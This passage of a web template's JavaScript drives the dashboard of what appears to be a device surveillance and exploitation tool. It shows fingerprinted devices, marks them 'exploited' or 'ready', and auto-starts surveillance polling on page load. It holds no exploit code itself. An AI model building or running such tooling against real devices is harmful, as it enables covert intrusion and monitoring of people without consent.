        document.getElementById('noDevicesMessage').style.display = 'none';
        return;
    }
    
    // Update device info panel with discovered device
    document.getElementById('deviceId').textContent = deviceInfo.ip_address || 'Unknown';
    document.getElementById('devicePlatform').textContent = deviceInfo.device_type || 'Unknown';
    document.getElementById('deviceOS').textContent = deviceInfo.os_fingerprint || 'Unknown';
    
    // Update connection status
    if (deviceInfo.open_ports && deviceInfo.open_ports.length > 0) {
        document.getElementById('deviceConnection').innerHTML = '<span class="text-success">Connected</span>';
        document.getElementById('deviceExploit').innerHTML = '<span class="text-warning">Ready</span>';
    } else {
        document.getElementById('deviceConnection').innerHTML = '<span class="text-warning">Detected</span>';
        document.getElementById('deviceExploit').innerHTML = '<span class="text-secondary">Not exploited</span>';
    }
    
    document.getElementById('deviceLastSeen').textContent = 'Just discovered';
}

function checkDeviceConnections() {
    // Check if we have any surveillance data indicating connected devices
    fetch('/api/surveillance/status')
        .then(response => response.json())
        .then(data => {
            if (data.active_sessions > 0) {
                // We have active surveillance sessions
                updateDeviceInfo(); // Use default device info
            } else {
                // No active sessions, show no devices message
                document.getElementById('deviceConnection').innerHTML = '<span class="text-danger">Disconnected</span>';
                document.getElementById('deviceExploit').innerHTML = '<span class="text-secondary">No exploit</span>';
                document.getElementById('deviceLastSeen').textContent = 'Never';
                document.getElementById('noDevicesMessage').style.display = 'block';
            }
        })
        .catch(error => {
            console.log('Device connection check failed:', error);
            // Show default connected state for demo
            updateDeviceInfo();
        });
}

// Auto-start surveillance when page loads
document.addEventListener('DOMContentLoaded', function() {
    // Check device connections first
    setTimeout(checkDeviceConnections, 500);
    
    // Start surveillance monitoring
    setTimeout(startSurveillance, 1000);
    
    // Fetch initial surveillance status
    setTimeout(function() {
        fetch('/api/surveillance/status')
            .then(response => response.json())
            .then(data => {
                updateEnhancedStatus({
                    active_sessions: data.active_sessions,
                    data_collected: data.sessions.reduce((total, s) => total + (s.packets_analyzed || 0), 0)
                });
                
                // Update device info based on surveillance status
                if (data.active_sessions > 0) {
                    updateDeviceInfo();
                }
            })
            .catch(error => console.log('Initial status fetch failed:', error));
    }, 2000);
    
    // Real-time updates every 30 seconds for enhanced data
    setInterval(function() {
        if (surveillanceActive) {
            fetch('/api/surveillance/status')
                .then(response => response.json())
                .then(data => {
                    updateEnhancedStatus({
                        active_sessions: data.active_sessions,
                        data_collected: data.sessions.reduce((total, s) => total + (s.packets_analyzed || 0), 0)
                    });
                })
                .catch(error => console.log('Enhanced status update failed:', error));
        }
    }, 30000);
    
    // Update device connection status every 10 seconds
    setInterval(checkDeviceConnections, 10000);
});
</script>
{% endblock %}
